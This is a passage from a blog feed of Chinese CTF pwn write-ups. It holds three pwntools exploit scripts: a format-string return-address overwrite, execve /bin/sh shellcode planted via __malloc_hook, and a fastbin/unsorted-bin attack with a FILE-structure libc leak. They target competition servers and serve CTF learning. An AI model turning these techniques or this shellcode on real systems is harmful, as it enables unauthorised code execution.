class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span> , <span class="number">0x4f3c2</span> , <span class="number">0x10a45c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------stack----------------</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(<span class="number">83</span>)+<span class="string">'$p'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line">con=p.recv()</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">29</span>:<span class="number">41</span>],<span class="number">16</span>)</span><br><span class="line">libc.address=leak<span class="number">-0x21b97</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">43</span>:<span class="number">55</span>],<span class="number">16</span>)</span><br><span class="line">main_addr=leak<span class="number">-0xe0</span></span><br><span class="line"></span><br><span class="line">rbp_addr=leak<span class="number">-0x200</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">info(<span class="string">"rbp_addr"</span>,rbp_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack=(main_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(libc.address+one[<span class="number">1</span>]&amp;<span class="number">0xffff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=((main_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(((libc.address+one[<span class="number">1</span>])&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=(rbp_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"><span class="comment">#dbg(0x12B1)</span></span><br><span class="line"></span><br><span class="line">attack=<span class="number">0xc1</span></span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><p>先泄露出libc_addr，程序申请出了一段固定的可读可写可执行的区域，在里面先填充为shellcode，7功能里面可以溢出修改到<code>__malloc_hook</code>,修改为shellcode的地址即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"./oldschool"</span></span><br><span class="line">arch = <span class="string">'32'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'106.14.214.3'</span>, <span class="number">2333</span></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment"># context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p=process(pwn_name)</span><br><span class="line">    <span class="comment"># p = process(["/glibc/2.23/64/lib/ld-2.23.so", "./pwn"], env=&#123;"LD_PRELOAD": "/glibc/2.23/64/lib/libc.so.6"&#125;)</span></span><br><span class="line">    <span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwn_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func, libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con, leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con, leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(p,exe=<span class="string">"./oldschool"</span>)</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script = <span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script = <span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        <span class="comment"># gdb.attach(p, script)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(address)</span>:</span></span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(idx, val)</span>:</span></span><br><span class="line">    choice(<span class="number">7</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele2</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_me</span><span class="params">(address,string_me)</span>:</span></span><br><span class="line">    shellcode = string_me + <span class="string">b"\x00"</span> * <span class="number">4</span></span><br><span class="line">    shellcode = shellcode[<span class="number">0</span>:(len(shellcode) // <span class="number">4</span>) * <span class="number">4</span>]</span><br><span class="line">    print(shellcode)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">0</span>, len(shellcode) , <span class="number">4</span>):</span><br><span class="line">        print(int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        print(hex(address+i),shellcode[item:item + <span class="number">4</span>])</span><br><span class="line">        edit2(address+i, int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span><span class="params">(address)</span>:</span></span><br><span class="line">    index = (address - <span class="number">0xe0000000</span>) // <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="comment"># -------------stack----------------</span></span><br><span class="line"><span class="comment"># add(0, 0x68)</span></span><br><span class="line"><span class="comment"># add(1, 0x68)</span></span><br><span class="line"><span class="comment"># add(2, 0x68)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(0, 'a' * 0x68 + '\n')</span></span><br><span class="line">shellcode=<span class="string">b"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80"</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    free(item)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_info=p.recvuntil(<span class="string">"\x0a"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">libc_addr=u32(libc_info[<span class="number">9</span>:<span class="number">9</span>+<span class="number">4</span>])<span class="number">-0x1d8828</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_me(<span class="number">0</span>,shellcode)<span class="comment">#写入shellcode</span></span><br><span class="line">print(hex(libc_addr+<span class="number">0x1d8788</span>))</span><br><span class="line"></span><br><span class="line">write_me(get_index(libc_addr+<span class="number">0x1d8788</span>),p32(<span class="number">0xe0000000</span>))<span class="comment">#malloc_hook</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>程序没有show功能，还限制了fastbin的大小，利用unsorted bin 攻击 global_max_fast，然后fastbin attack 打iofile，泄露libc_addr,再次fastbin attack打 <code>__malloc_hook</code>为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process('./easypwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./easypwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-easypwn.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd2</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:\n"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"content:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"n"</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2--&gt;1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">"n"</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#5--&gt;4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span><span class="number">-0x5</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">7</span>,p16(<span class="number">0x25dd</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,<span class="string">"11"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c5600</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">og = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one = libc_base + og[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"n"</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。&lt;/p&gt;
&lt;p&gt;最终48名，尽力了，没有进线下。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://nocbtm.github.io/imgs/ISEE3DP466
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020国赛线上赛 pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/22/2020%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/22/2020国赛线上赛-pwn-wp/</id>
    <published>2020-08-22T11:24:30.000Z</published>
    <updated>2020-09-01T12:44:22.273Z</updated>
    
